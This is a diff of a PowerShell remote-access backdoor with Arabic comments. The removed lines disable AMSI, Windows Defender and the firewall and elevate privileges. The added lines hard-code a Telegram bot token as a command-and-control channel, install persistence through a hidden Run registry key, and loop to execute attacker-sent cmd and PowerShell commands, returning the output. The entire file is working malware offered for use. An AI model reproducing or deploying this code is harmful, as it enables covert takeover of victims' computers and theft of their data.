@@ -1,44 +1,55 @@
-# --- [1] كسر الحماية النووي (Zero-Day AMSI Bypass) ---
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)))
+# --- [STARK OMEGA: BRIDGE GIANTS-5] ---
+# الوظيفة: بوابة تحكم خلفية (Reverse Shell) لتنفيذ الأوامر الحية عبر تليجرام
 
-# --- [2] السيطرة المطلقة (Root/System Elevation) ---
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $newProcess = New-Object System.Diagnostics.ProcessStartInfo "powershell.exe"
-    $newProcess.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
-    $newProcess.Verb = "runas"
-    [System.Diagnostics.Process]::Start($newProcess)
-    exit
+$ErrorActionPreference = 'SilentlyContinue'
+
+# الثوابت
+$BOT_TOKEN = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
+$CHAT_ID = "7393359923"
+
+# آلية البقاء (Persistence) - زرع البوابة في النظام
+$path = "$env:APPDATA\Microsoft\Windows\System32_Bridge.ps1"
+if (!(Test-Path $path)) {
+    $MyContent = (New-Object Net.WebClient).DownloadString($MyInvocation.MyCommand.Definition)
+    $MyContent | Out-File -FilePath $path
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsTerminalService' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
 }
 
-# --- [3] تعطيل جميع دروع الحماية (The Blackout) ---
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection Combined -Force
-netsh advfirewall set allprofiles state off
+function Send-Response($text) {
+    $url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+    $body = @{ chat_id = $CHAT_ID; text = "<b>[BRIDGE OUTPUT]:</b>`n<pre>$text</pre>"; parse_mode = "HTML" }
+    Invoke-RestMethod -Uri $url -Method Post -Body $body
+}
 
-# --- [4] إعدادات الاتصال الحي (Live C2) ---
-$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
-$c = "7393359923"
+# إشعار البدء
+Send-Response "⚡ البوابة نشطة الآن. بانتظار الأوامر..."
 
-# دالة لإرسال النتائج فوراً
-function Send-Live { param($data) curl.exe -s -X POST "https://api.telegram.org/bot$t/sendMessage" -d "chat_id=$c&text=$data" }
+$lastUpdateId = 0
 
-Send-Live "👑 OVERLORD INITIALIZED: SYSTEM ACCESS SECURED. WAITING FOR COMMANDS..."
-
-# --- [5] حلقة التحكم اللانهائية (Live Shell Loop) ---
-$lastUpdate = 0
 while($true) {
     try {
-        $response = Invoke-RestMethod "https://api.telegram.org/bot$t/getUpdates?offset=-1"
-        if ($response.result) {
-            $cmd = $response.result[0].message.text
-            $updateId = $response.result[0].update_id
+        # جلب الرسائل الجديدة من البوت
+        $response = Invoke-RestMethod "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=$($lastUpdateId + 1)&timeout=30"
+        
+        foreach ($update in $response.result) {
+            $lastUpdateId = $update.update_id
+            $msg = $update.message.text
             
-            if ($updateId -ne $lastUpdate) {
-                $lastUpdate = $updateId
-                # تنفيذ الأمر في بيئة معزولة وإرسال النتيجة
-                $output = iex $cmd 2>&1 | Out-String
-                if ($output) { Send-Live "💻 Output:`n$output" }
+            # نمط الأمر المخصص: [cmd: your_command] أو [ps: your_command]
+            if ($msg -match "^cmd: ") {
+                $command = $msg.Substring(5)
+                $output = cmd.exe /c $command 2>&1 | Out-String
+                Send-Response $output
+            }
+            elseif ($msg -match "^ps: ") {
+                $command = $msg.Substring(4)
+                $output = Invoke-Expression $command 2>&1 | Out-String
+                Send-Response $output
             }
         }
-    } catch { }
-    Start-Sleep -Milliseconds 500 # استجابة لحظية (نص ثانية)
+    } catch {
+        # في حالة فقدان الاتصال، يحاول مرة أخرى بعد 10 ثواني
+        Start-Sleep -Seconds 10
+    }
+    Start-Sleep -Seconds 2
 }
